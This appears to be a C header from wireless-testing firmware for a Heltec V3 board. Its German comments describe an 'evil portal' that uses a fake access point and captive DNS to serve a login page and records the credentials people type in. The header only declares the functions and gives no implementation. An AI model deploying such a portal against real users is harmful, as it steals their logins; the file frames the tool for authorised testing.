// G4MEOVER — Evil Portal (Captive Portal) fuer den Heltec V3.
// SoftAP + Captive-DNS (alles -> AP-IP) + HTTP-Login-Seite, die eingegebene
// Zugangsdaten ueber Serial protokolliert. Uebernimmt das WiFi voll (SoftAP) —
// ESP-NOW pausiert waehrenddessen; Steuerung/Stop laeuft ueber den 868-Kanal.
//
// NUR fuer autorisierte Security-Tests / eigene Hardware / CTF.
#pragma once
#include <stdint.h>

// portal_id waehlt SSID + Login-Template. espnow_channel wird beim Stop wiederhergestellt.
void     evil_portal_start(uint8_t portal_id, uint8_t espnow_channel);
void     evil_portal_stop();
void     evil_portal_tick();       // in loop() aufrufen (DNS + HTTP bedienen)
bool     evil_portal_active();
uint32_t evil_portal_cred_count(); // Anzahl erfasster Login-Versuche
const char* evil_portal_ssid();
